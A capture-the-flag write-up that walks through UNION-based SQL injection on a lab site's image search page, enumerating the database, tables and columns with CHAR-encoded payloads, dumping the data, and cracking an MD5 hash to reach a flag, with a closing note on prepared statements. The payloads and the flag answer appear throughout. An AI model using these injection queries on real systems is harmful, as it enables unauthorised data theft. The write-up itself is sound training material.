
LOCATION: BUTTON (search images) -> `/index.php?page=searchimg`

From home page scroll down and select search image.
in the search field type '1 or 1=1' (without the single quote).
We get a result and this indicates that the page is vulnerable to sql injection.

Run this input/Query in search field to get the database name: -1 UNION SELECT 1,database().

"""
    UNION : this SQL keyword lets you execute one or more additional SELECT queries and append the results to the original query.
    the (input) take an argument (maybe int maybe string), and query it in server side to `SELECT * from TABLE_name WHERE ID = (input)`

    so if our input is : 2 , request will be : 
        `SELECT * from TABLE_name WHERE ID = 2`
    what we need here is to know the database name where this table exist
    
    database():  this sql function return the db name where its called
"""
::Response : `Member_images` :: as database name

########################################################################################################################################

and because the server doesn't accept strings we used the numbers correspond to the ASCII value of 'Member_images'.

Run this input/Query in search field to get the table name:
        `-1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES
        WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)`

::Response : `list_images` :: as table name

########################################################################################################################################

- Conversion to ASCII value :  (Online tool : 'https://www.browserling.com/tools/text-to-ascii')
    :: `Member_images` = TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
    :: `list_images` = TABLE_NAME = CHAR(108,105,115,116,095,105,109,097,103,101,115)

########################################################################################################################################

Run this input/Query in search field to get the columns names in the table: 

        `-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS
        WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
        AND TABLE_NAME = CHAR(108,105,115,116,095,105,109,097,103,101,115)`

we get the following columns : id, url, title, comment.

Run this input/Query in search field to get all the table data: 
        `-1 UNION SELECT url, CONCAT (id, title, id, comment) FROM list_images`

(we used ID in multiple places so the concated result can be splitted by ID value and easy to read)

::Response : (at the 5th row) : `5 borntosec.ddns.net/images.png 
            Hack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

when we decrypt the code using MD5 we got "albatroz", then we run sha256 on it, then we got the flag.

::Tools :
    - MD5 : https://md5decrypt.net/ :: `1928e8083cf461a51303633093573c46` => `albatroz`
    - sha256 : https://md5decrypt.net/Sha256/ :: `albatroz` => `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

How to secure:
-use Prepared Statements/Bound Parameters 
    to prevent sql injections (write the SQL command and the user-provided data separately) 
    so the input will be set into the query as value and not as part of the sql query.